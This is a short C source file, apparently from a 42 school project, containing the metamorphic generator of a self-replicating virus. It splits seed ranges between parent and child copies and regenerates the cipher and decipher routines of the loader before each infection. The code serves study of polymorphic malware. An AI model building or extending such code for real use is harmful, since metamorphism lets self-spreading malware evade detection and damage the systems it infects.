/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2019/12/13 09:13:48 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "polymorphism.h"
#include "errors.h"

/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It works by regenerating its own loader (the one that is loaded in memory)
**   before it is copied by our virus later on.
**
**   The uint64_t seed[2] is the range of seeds that belongs to our virus.
**   The first number is the seed of the current virus.
**   The last number is the last seed that belongs to the current virus.
**   All the numbers that aren't in this range are owned by other UNIQUE copies
**   of this virus.
**
**   When a new virus is bred, the parent gives away a part of his seed range
**   to his child, losing ownership of the range given.
**
**   (1)    father[n, m]
**   (2)    father infects son
**   (3)    father[n, p] and son[p + 1, m] with n < p < m
**
*/
bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2])
{
	size_t cypher_size = (size_t)cypher_end - (size_t)cypher;

	if (!yield_seed_to_heir(seed, son_seed)
	|| !generate_cypher((void *)cypher, son_seed[0], cypher_size)
	|| !generate_decypher((void *)decypher, son_seed[0], cypher_size)
	|| !true) // add more metamorphosis above!
		return errors(ERR_THROW, 'm', '1');
	return true;
}
